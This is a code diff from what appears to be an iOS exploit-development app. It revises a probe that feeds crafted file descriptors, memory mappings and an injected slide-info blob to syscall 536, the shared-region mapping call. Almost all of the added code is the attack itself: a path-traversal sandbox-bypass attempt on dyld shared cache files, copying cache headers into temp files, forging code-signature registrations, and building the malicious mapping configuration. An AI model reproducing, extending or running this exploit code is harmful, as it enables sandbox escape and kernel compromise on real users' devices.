@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v216: syscall + Phase E (no child, fd=-1 inject) ===\n"];
+        [self appendLog:@"\n=== Rie v222: 3-file sr_cfg, cache path probes, correct mappings ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9559,30 +9559,183 @@ static uint64_t rie_find_exec_base(task_t task,
                     ps[2]=0xFFFE;
                     [self appendLog:[NSString stringWithFormat:@"blob: ver=5 cnt=%u target[2]=0xFFFE total=%zu", BLOB_PC, blobSz]];
 
-                    // Build sr_cfg, call syscall 536
+                    // Build sr_cfg (3-files, 3-mappings) per reference exploit layout
+                    // Strategy: try to get real fds for cache files (header + subcache)
+                    // 1) Probe disk paths via sandbox-bypass NSFileHandle
+                    // 2) Fallback: read header from SR submap → temp file → open fd
                     #define CFG_SZ (sizeof(struct rie_sr_cfg) + 0x4000)
+                    #define HDR_SZ 0x90000ULL   // TEXT header size from region 0
+                    #define BLOB_SR (0x180000000ULL + HDR_SZ)  // blob page right after header
+                    #define F_ADDFILESIGS_RETURN 97
                     void *cfg = mmap(NULL, CFG_SZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
                     if (cfg != MAP_FAILED) {
                         memset(cfg, 0, CFG_SZ);
                         struct rie_sr_cfg *c = (struct rie_sr_cfg *)cfg;
                         c->magic = RIE_SR_CFG_MAGIC; c->blob_off = 0x4000;
-                        c->files[0].sf_fd = -1; c->files[0].sf_mappings_count = 1;
+                        c->fault_addr = naAddr; c->blob_size = blobSz;
+
+                        int fd_main = -1, fd_sub = -1;
+
+                        // ── Try to open main cache (TEXT header) ──
+                        // Step 1: disk paths via NSFileHandle with sandbox bypass
+                        const char *cachePaths[] = {
+                            "/System/Library/dyld/",
+                            "/System/Cryptexes/OS/System/Library/dyld/",
+                            "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/",
+                        };
+                        const char *cacheFile = "dyld_shared_cache_arm64e";
+                        for (int pi = 0; pi < 3 && fd_main < 0; pi++) {
+                            char raw[1024];
+                            snprintf(raw, sizeof(raw), "%s%s%s", "../../../../../../../../../../../../../", cachePaths[pi], cacheFile);
+                            NSString *nsp = [[NSString stringWithUTF8String:raw] stringByResolvingSymlinksInPath];
+                            NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:nsp];
+                            if (fh) {
+                                fd_main = dup((int)fh.fileDescriptor);
+                                [fh closeFile];
+                                [self appendLog:[NSString stringWithFormat:@"main cache OPEN disk[%d]: %@ fd=%d", pi, nsp, fd_main]];
+                                // Register code signature
+                                rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
+                                fs.fs_file_start = 0;
+                                uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
+                                fs.fs_blob_start = (void*)(uintptr_t)(*(uint64_t*)(hb+0x28));
+                                fs.fs_blob_size = (size_t)(*(uint64_t*)(hb+0x30));
+                                int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
+                                [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(fd_main=%d) rc=%d", fd_main, rc]];
+                            }
+                        }
+
+                        // Step 2: fallback — read main cache header from SR submap → temp file
+                        if (fd_main < 0) {
+                            [self appendLog:@"disk cache miss; building temp cache from SR submap..."];
+                            // Region 0 is always the main cache header: addr=0x1824cc000 sz=0x90000
+                            // Read tiny header to get csOff/csSz for main cache
+                            uint64_t mainHdrSR = 0x1824cc000ULL;
+                            uint8_t tiny[0x40];
+                            if (rie_vmRead2(mach_task_self_, mainHdrSR, 0x40, (rie_mach_vm_address_t*)&tiny, (rie_mach_vm_size_t[]){0x40}) == 0) {
+                                uint64_t mcOff = *(uint64_t*)(tiny+0x028);
+                                uint64_t mcSz  = *(uint64_t*)(tiny+0x030);
+                                uint64_t fileSz = mcOff + mcSz; // header up to end of code sig
+                                if (fileSz > 0x100000) fileSz = 0x100000; // cap at 1MB
+                                [self appendLog:[NSString stringWithFormat:@"main cache cs=0x%llx+0x%llx fileSz=0x%llx", mcOff, mcSz, fileSz]];
+
+                                // Allocate buffer and read from SR submap
+                                uint8_t *fbuf = (uint8_t*)malloc((size_t)fileSz);
+                                if (fbuf) {
+                                    memset(fbuf, 0, (size_t)fileSz);
+                                    // Read header region: 0x90000 bytes from mainHdrSR
+                                    rie_mach_vm_size_t rdSz = HDR_SZ;
+                                    kern_return_t kr = rie_vmRead2(mach_task_self_, mainHdrSR, (rie_mach_vm_size_t)HDR_SZ,
+                                        (rie_mach_vm_address_t*)fbuf, &rdSz);
+                                    [self appendLog:[NSString stringWithFormat:@"read main hdr from SR: kr=%d got=%llu", kr, rdSz]];
+                                    // Read code sig from next region (region 1: 0x18255c000 = mainHdrSR + HDR_SZ)
+                                    if (kr == 0 && mcOff + mcSz > HDR_SZ) {
+                                        uint64_t remainOff = HDR_SZ;
+                                        uint64_t remainSz = mcOff + mcSz - HDR_SZ;
+                                        uint64_t csSR = mainHdrSR + HDR_SZ;
+                                        rie_mach_vm_size_t csRd = (rie_mach_vm_size_t)remainSz;
+                                        kr = rie_vmRead2(mach_task_self_, csSR, (rie_mach_vm_size_t)remainSz,
+                                            (rie_mach_vm_address_t*)(fbuf + remainOff), &csRd);
+                                        [self appendLog:[NSString stringWithFormat:@"read codeSig from SR: kr=%d got=%llu", kr, csRd]];
+                                    }
+
+                                    // Write to temp file
+                                    NSString *tmpMain = [NSTemporaryDirectory() stringByAppendingPathComponent:@"rie_main.cache"];
+                                    NSData *d = [NSData dataWithBytesNoCopy:fbuf length:(NSUInteger)fileSz freeWhenDone:NO];
+                                    if ([d writeToFile:tmpMain atomically:NO]) {
+                                        fd_main = open([tmpMain UTF8String], O_RDONLY);
+                                        [self appendLog:[NSString stringWithFormat:@"temp cache written: %@ fd=%d", tmpMain, fd_main]];
+                                        // Register code signature
+                                        rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
+                                        fs.fs_file_start = 0;
+                                        fs.fs_blob_start = (void*)(uintptr_t)mcOff;
+                                        fs.fs_blob_size = (size_t)mcSz;
+                                        int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
+                                        [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(temp fd=%d) rc=%d", fd_main, rc]];
+                                    } else {
+                                        [self appendLog:@"!! failed to write temp cache file"];
+                                    }
+                                    free(fbuf);
+                                }
+                            }
+                        }
+
+                        // ── Try to open subcache for slide carrier ──
+                        // The non-auth carrier is in region 36 (subcache header at naHdrAddr)
+                        // Write that subcache header + codeSig to another temp file
+                        {
+                            uint8_t stiny[0x40];
+                            if (rie_vmRead2(mach_task_self_, naHdrAddr, 0x40, (rie_mach_vm_address_t*)&stiny, (rie_mach_vm_size_t[]){0x40}) == 0) {
+                                uint64_t scOff = *(uint64_t*)(stiny+0x028);
+                                uint64_t scSz  = *(uint64_t*)(stiny+0x030);
+                                [self appendLog:[NSString stringWithFormat:@"subcache cs=0x%llx+0x%llx", scOff, scSz]];
+                                if (scOff > 0 && scSz > 0 && scOff + scSz <= 0x100000) {
+                                    uint64_t sfileSz = scOff + scSz;
+                                    uint8_t *sbuf = (uint8_t*)malloc((size_t)sfileSz);
+                                    if (sbuf) {
+                                        memset(sbuf, 0, (size_t)sfileSz);
+                                        rie_mach_vm_size_t srd = (rie_mach_vm_size_t)sfileSz;
+                                        kern_return_t kr = rie_vmRead2(mach_task_self_, naHdrAddr, (rie_mach_vm_size_t)sfileSz,
+                                            (rie_mach_vm_address_t*)sbuf, &srd);
+                                        [self appendLog:[NSString stringWithFormat:@"read subcache from SR: kr=%d got=%llu", kr, srd]];
+                                        NSString *tmpSub = [NSTemporaryDirectory() stringByAppendingPathComponent:@"rie_sub.cache"];
+                                        NSData *sd = [NSData dataWithBytesNoCopy:sbuf length:(NSUInteger)sfileSz freeWhenDone:NO];
+                                        if ([sd writeToFile:tmpSub atomically:NO]) {
+                                            fd_sub = open([tmpSub UTF8String], O_RDONLY);
+                                            [self appendLog:[NSString stringWithFormat:@"temp subcache: %@ fd=%d", tmpSub, fd_sub]];
+                                            rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
+                                            fs.fs_file_start = 0;
+                                            fs.fs_blob_start = (void*)(uintptr_t)scOff;
+                                            fs.fs_blob_size = (size_t)scSz;
+                                            int rc = fcntl(fd_sub, F_ADDFILESIGS_RETURN, &fs);
+                                            [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(sub fd=%d) rc=%d", fd_sub, rc]];
+                                        }
+                                        free(sbuf);
+                                    }
+                                }
+                            }
+                        }
+
+                        // files[0]: main cache TEXT header
+                        c->files[0].sf_fd = fd_main;
+                        c->files[0].sf_mappings_count = 1;
+                        // files[1]: fd=-1 blob injection
                         c->files[1].sf_fd = -1; c->files[1].sf_mappings_count = 1;
+                        // files[2]: subcache slide carrier
+                        c->files[2].sf_fd = fd_sub;
+                        c->files[2].sf_mappings_count = 1;
+
+                        // mappings[0]: TEXT header at SR base (RX, 0x90000 bytes)
                         c->mappings[0].sms_address = 0x180000000ULL;
-                        c->mappings[0].sms_size = naSize;
-                        c->mappings[0].sms_max_prot = 1; c->mappings[0].sms_init_prot = 1;
-                        c->mappings[1].sms_address = 0x180000000ULL + naSize;
+                        c->mappings[0].sms_size = HDR_SZ;
+                        c->mappings[0].sms_max_prot = 5; c->mappings[0].sms_init_prot = 5; // RX
+                        // mappings[1]: blob injection at BLOB_SR (one page, R)
+                        c->mappings[1].sms_address = BLOB_SR;
                         c->mappings[1].sms_size = 0x4000;
                         c->mappings[1].sms_file_offset = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
-                        c->mappings[1].sms_max_prot = 1; c->mappings[1].sms_init_prot = 1;
-                        c->fault_addr = naAddr; c->blob_size = blobSz;
+                        c->mappings[1].sms_max_prot = 1; c->mappings[1].sms_init_prot = 1; // R
+                        // mappings[2]: slide carrier (non-auth), slide_info from injected blob
+                        c->mappings[2].sms_address = naAddr;
+                        c->mappings[2].sms_size = naSize;
+                        c->mappings[2].sms_file_offset = naFoff;
+                        c->mappings[2].sms_slide_size = blobSz;
+                        c->mappings[2].sms_slide_start = BLOB_SR;
+                        c->mappings[2].sms_max_prot = naMax; c->mappings[2].sms_init_prot = naInit;
+
                         memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);
-                        [self appendLog:[NSString stringWithFormat:@"calling syscall(536, 2files, 2maps) fault=0x%llx...", naAddr]];
-                        long r = sc(536, 2, c->files, 2, c->mappings);
+                        [self appendLog:[NSString stringWithFormat:@"sr_cfg: hdr=0x180000000+0x%llx blob=0x%llx+0x4000 carrier=0x%llx+0x%llx slideBlob=0x%llx sz=%zu",
+                            HDR_SZ, BLOB_SR, naAddr, naSize, BLOB_SR, blobSz]];
+                        [self appendLog:[NSString stringWithFormat:@"calling syscall(536, 3files, 3maps) fds=[%d,%d,%d]...",
+                            c->files[0].sf_fd, c->files[1].sf_fd, c->files[2].sf_fd]];
+                        long r = sc(536, 3, c->files, 3, c->mappings);
                         [self appendLog:[NSString stringWithFormat:@"syscall(536): ret=%ld errno=%d", r, errno]];
+                        if (fd_main >= 0) close(fd_main);
+                        if (fd_sub >= 0) close(fd_sub);
                         munmap(cfg, CFG_SZ);
                     }
+                    #undef HDR_SZ
+                    #undef BLOB_SR
                     #undef CFG_SZ
+                    #undef F_ADDFILESIGS_RETURN
                     free(blob);
                 }
                 #undef BLOB_PS
